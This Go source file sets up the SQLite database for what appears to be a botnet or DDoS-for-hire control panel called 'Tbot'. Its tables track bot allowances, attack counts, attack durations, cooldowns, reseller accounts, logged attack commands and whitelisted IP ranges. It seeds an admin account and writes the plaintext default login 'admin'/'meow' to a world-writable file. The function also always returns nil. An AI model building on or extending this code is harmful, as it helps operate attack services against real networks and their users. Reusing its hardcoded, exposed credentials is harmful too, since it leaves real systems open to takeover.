package database

import (
	"database/sql"
	"fmt"
	"log"
	"os"

	_ "github.com/mattn/go-sqlite3"
)

type Database struct {
	db *sql.DB
}

var DatabaseConnection *Database

func NewDatabase(dbPath string) *Database { // TODO: Rewrite entire database to work flawlessly with SQLite3
	_, err := os.Stat(dbPath)
	isNewDB := os.IsNotExist(err)

	db, err := sql.Open("sqlite3", dbPath)
	if err != nil {
		log.Fatal(err)
	}

	if isNewDB {
		_, err = db.Exec(`
			CREATE TABLE IF NOT EXISTS users (
				id INTEGER PRIMARY KEY,
				username TEXT NOT NULL,
				password TEXT NOT NULL,
				max_bots INTEGER NOT NULL DEFAULT -1,
				admin INTEGER NOT NULL DEFAULT 0,
				reseller INTEGER NOT NULL DEFAULT 0,
				maxAttacks INTEGER NOT NULL DEFAULT 100,
				totalAttacks INTEGER NOT NULL DEFAULT 0,
				expiry INTEGER NOT NULL, -- Change this column type to INTEGER
				maxTime INTEGER NOT NULL DEFAULT 60,
				cooldown INTEGER NOT NULL DEFAULT 100,
				created_by TEXT NOT NULL
			);
		
			INSERT INTO users (username, password, max_bots, admin, reseller, maxAttacks, totalAttacks, expiry, maxTime, cooldown, created_by)
			VALUES ('admin', '$2a$10$.3UKrVqvKhiUNPrgF35V6OR51af.HRODQlJ/uKOLgZlQntGSqgouS' , -1, 1, 0, 100, 0, strftime('%s', 'now', '+6969 days'), 60, 0, 'sqlite3');

	        CREATE TABLE IF NOT EXISTS history (
	            id INTEGER PRIMARY KEY,
	            user_id INTEGER NOT NULL,
	            time_sent INTEGER NOT NULL,
	            duration INTEGER NOT NULL,
	            command TEXT NOT NULL,
	            max_bots INTEGER DEFAULT -1,
	            FOREIGN KEY (user_id) REFERENCES users (id)
	        );

	        CREATE TABLE IF NOT EXISTS whitelist (
	            id INTEGER PRIMARY KEY,
	            prefix TEXT,
	            netmask INTEGER,
	            UNIQUE(prefix, netmask)
	        );
	    `)
		if err != nil {
			log.Fatal(err)
		}

		filename := "assets/default.credentials"

		file, err := os.OpenFile(filename, os.O_RDWR|os.O_APPEND|os.O_CREATE, 0777)
		if err != nil {
			fmt.Println(err)
		}
		defer func(file *os.File) {
			err := file.Close()
			if err != nil {

			}
		}(file)
		_, err = fmt.Fprintf(file, "Username: admin\nPassword: meow")
		if err != nil {
			return nil
		}
		err = file.Close()
		if err != nil {
			return nil
		}

		fmt.Printf("[Tbot] Successfully set up Sqlite3 with default login:\n - Username: `admin`\n - Password: `meow`\n")
	}

	fmt.Println("Database connection initiated.")
	DatabaseConnection = &Database{db}
	return nil
}
